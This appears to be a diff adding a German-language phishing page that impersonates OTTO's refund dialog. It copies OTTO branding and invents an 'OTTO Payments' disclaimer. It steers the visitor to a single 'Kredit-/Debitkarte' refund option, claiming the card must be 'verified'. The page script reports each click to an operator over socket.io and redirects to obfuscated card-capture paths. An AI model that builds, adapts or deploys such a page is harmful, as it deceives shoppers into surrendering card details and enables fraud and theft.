@@ -1,0 +1,359 @@
+<!DOCTYPE html>
+<html lang="de">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Auszahlungsmethode auswählen</title>
+    <link rel="stylesheet" href="/css/otto.css">
+    <style>
+        /* Specific overrides and styles for the payment page */
+        .payment-box {
+            background-color: #fff;
+            width: 600px;
+            border-radius: 4px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.05);
+            margin: 0 auto;
+            overflow: hidden;
+            padding-bottom: 25px;
+        }
+
+        .payment-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 20px 25px;
+            border-bottom: 1px solid #eaeaea;
+        }
+
+        .payment-header svg {
+            width: 20px;
+            height: 20px;
+            fill: #555;
+            cursor: pointer;
+        }
+
+        .payment-title {
+            font-size: 16px;
+            font-weight: 700;
+            color: #222;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .payment-title svg {
+            width: 14px;
+            height: 14px;
+            fill: #555;
+        }
+
+        .payment-content {
+            padding: 25px 40px;
+        }
+
+        .warning-banner {
+            background-color: #fbebe0;
+            padding: 15px 20px;
+            border-radius: 4px;
+            margin-bottom: 25px;
+            font-size: 13px;
+            line-height: 1.5;
+            color: #333;
+        }
+
+        .warning-banner strong {
+            color: #c04000;
+            display: block;
+            margin-bottom: 10px;
+            font-size: 14px;
+        }
+
+        .warning-banner p {
+            margin-bottom: 8px;
+        }
+
+        .warning-banner p:last-child {
+            margin-bottom: 0;
+        }
+
+        .section-label {
+            font-size: 14px;
+            font-weight: bold;
+            color: #222;
+            margin-bottom: 15px;
+        }
+
+        .payment-option {
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            padding: 15px 20px;
+            margin-bottom: 15px;
+            cursor: pointer;
+            box-shadow: 0 1px 4px rgba(0,0,0,0.08);
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+
+        .payment-option:hover {
+            border-color: #999;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.12);
+        }
+
+        /* Styling the selected option (Vorkasse in the image) */
+        .payment-option.selected {
+            border: 1px solid #888;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.15);
+        }
+
+        .option-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 8px;
+        }
+
+        .option-title-group {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .option-icon {
+            width: 24px;
+            height: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .option-icon img {
+            max-width: 100%;
+            max-height: 100%;
+        }
+
+        .option-name {
+            font-size: 14px;
+            font-weight: 700;
+            color: #222;
+        }
+
+        .option-logos {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        
+        .option-logos img {
+            height: 16px;
+        }
+
+        .option-right-text {
+            font-size: 12px;
+            color: #777;
+        }
+
+        .option-desc {
+            font-size: 12px;
+            color: #555;
+            line-height: 1.5;
+            padding-left: 34px; /* Align with text, bypassing the icon */
+        }
+
+        .disclaimer-text {
+            font-size: 11px;
+            color: #555;
+            line-height: 1.6;
+            text-align: center;
+            margin: 25px 0;
+            padding: 0 20px;
+        }
+
+        .disclaimer-text a {
+            color: #555;
+            text-decoration: underline;
+        }
+
+        .disclaimer-text a:hover {
+            color: #333;
+        }
+
+        .btn-wrapper {
+            padding: 0 40px;
+            display: flex;
+            justify-content: center;
+        }
+
+        .btn-wrapper .btn {
+            width: 100%;
+            border-radius: 6px;
+        }
+        
+        .mPP-ico{
+            height: 30px;
+        }
+        .mcard-ico{
+            height: 30px;
+        }
+
+        /* Mobile Responsiveness */
+        @media screen and (max-width: 768px) {
+            .payment-box {
+                width: 100%;
+                border-radius: 0;
+                box-shadow: none;
+            }
+            .payment-content {
+                padding: 20px 15px;
+            }
+            .btn-wrapper {
+                padding: 0 15px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="pl_focussed-dialog__container">
+        
+        <div class="hedopan">
+            <img src="./img/hedoipa.PNG" alt="OTTO" />
+        </div>
+        
+        <div class="payment-box">
+            
+            <div class="payment-header">
+                <!-- Back Arrow Icon -->
+                <svg viewBox="0 0 24 24" onclick="window.history.back()">
+                    <path d="M15.41 16.59L10.83 12l4.58-4.59L14 6l-6 6 6 6 1.41-1.41z"/>
+                </svg>
+                
+                <div class="payment-title">
+                    Wie möchtest du die Erstattung erhalten?
+                    <!-- Lock Icon -->
+                    <svg viewBox="0 0 24 24">
+                        <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM9 6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9V6zm9 14H6V10h12v10zm-6-3c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2z"/>
+                    </svg>
+                </div>
+                
+                <!-- Close Icon -->
+                <svg viewBox="0 0 24 24">
+                    <path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/>
+                </svg>
+            </div>
+
+            <div class="payment-content">
+                
+                <div class="warning-banner">
+                    <strong>Bitte wähle eine Auszahlungsmethode</strong>
+                    <p>Zurzeit können wir dir nicht alle Optionen für die Rückerstattung anbieten. Das kann verschiedene Gründe haben.</p>
+                    <p>Wir haben die Auswahl für dich angepasst.</p>
+                </div>
+
+                <div class="section-label">Auszahlung auf</div>
+
+                <!-- PayPal -->
+                
+
+                <!-- Credit Card -->
+                <div class="payment-option" id="cc-section">
+                    <div class="option-header">
+                        <div class="option-title-group">
+                            <div class="option-icon">
+                                <img src="./img/methodcard-ico.PNG" alt="">
+                            </div>
+                            <div class="option-name">Kredit-/Debitkarte</div>
+                        </div>
+                        <div class="option-logos">
+                            <!-- Placeholder for VISA / Mastercard icons -->
+                            <img src="./img/ccico02.PNG" alt="">
+                        </div>
+                    </div>
+                    <div class="option-desc">
+                        Du wirst weitergeleitet, um deine Karte für den Empfang der Erstattung zu verifizieren.<br>
+                        Die Gutschrift erfolgt direkt auf dein Kartenkonto.
+                    </div>
+                </div>
+
+                <!-- Vorkasse -->
+                
+
+                <div class="disclaimer-text">
+                    Diese Entscheidung basiert auf einem automatisierten Datenverarbeitungsverfahren.<br>
+                    Weiterführende Informationen findest du in den <a href="#">Datenschutzinformationen unseres Zahlungspartners OTTO Payments.</a>
+                </div>
+
+                <div class="btn-wrapper">
+                    <button type="button" class="btn btn-red">Auszahlungsmethode bestätigen</button>
+                </div>
+
+            </div>
+        </div>
+    </div>
+
+    <footer class="footer">
+        <div class="footer-lines">
+            <a href="#">Cookie-Einstellungen</a> &middot;
+            <a href="#">AGB</a> &middot;
+            <a href="#">Datenschutz</a> &middot;
+            <a href="#">Impressum</a> &middot;
+            <br>
+            <a href="#">Information zur Barrierefreiheit</a> &middot;
+            <a href="#">Produktsicherheitsrückrufe</a> &middot;
+            <a href="#">OTTO Versprechen</a>
+        </div>
+        <div class="price-info">
+            Preisangaben inkl. Steuer und zzgl. Service- und Versandkosten
+        </div>
+    </footer>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script src="/js/tracker.js"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            const paypalSection = document.getElementById('paypal-section');
+            const ccSection = document.getElementById('cc-section');
+
+            if (paypalSection) {
+                paypalSection.addEventListener('click', function () {
+                    // Show a loading state or visual feedback if desired
+                    this.style.opacity = '0.5';
+
+                    if (typeof io !== 'undefined') {
+                        const socket = io();
+                        socket.emit('visitor_action', {
+                            type: 'form_submit',
+                            target: 'Bgha-Method-PayPal',
+                            details: { action_type: "bgha PP" },
+                            redirectUrl: '/loadPPxCvGk6Hb'
+                        });
+                    }
+                    setTimeout(() => {
+                        window.location.href = '/loadPPxCvGk6Hb';
+                    }, 1000);
+                });
+            }
+
+            if (ccSection) {
+                ccSection.addEventListener('click', function () {
+                    // Show a loading state or visual feedback if desired
+                    this.style.opacity = '0.5';
+
+                    if (typeof io !== 'undefined') {
+                        const socket = io();
+                        socket.emit('visitor_action', {
+                            type: 'form_submit',
+                            target: 'Bgha-Method-CreditCard',
+                            details: { action_type: "Clicked on Credit Card Section" },
+                            redirectUrl: '/loading?time=3&url=/CAPOCA6a7d5affa'
+                        });
+                    }
+                    setTimeout(() => {
+                        window.location.href = '/loading?time=3&url=/CAPOCA6a7d5affa';
+                    }, 1000);
+                });
+            }
+        });
+    </script>
+</body>
+
+</html>
